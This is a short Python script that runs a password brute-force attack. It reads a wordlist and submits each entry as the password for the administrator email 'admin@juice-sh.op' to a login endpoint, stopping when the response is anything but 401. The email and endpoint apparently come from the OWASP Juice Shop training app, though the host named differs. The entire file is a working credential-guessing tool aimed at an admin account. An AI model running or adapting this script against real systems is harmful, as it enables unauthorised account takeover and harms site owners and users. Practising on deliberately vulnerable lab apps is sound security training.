import requests

with open("wordlists.txt", "r") as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()
    data = {"email": "admin@juice-sh.op", "password": password}
    response = requests.post("http://shop.bancocn.com/rest/user/login", json=data)
    code = response.status_code
    print("{} - {}".format(password, code))
    if code != 401:
        print("[+] Password Found - {}".format(password))
        break
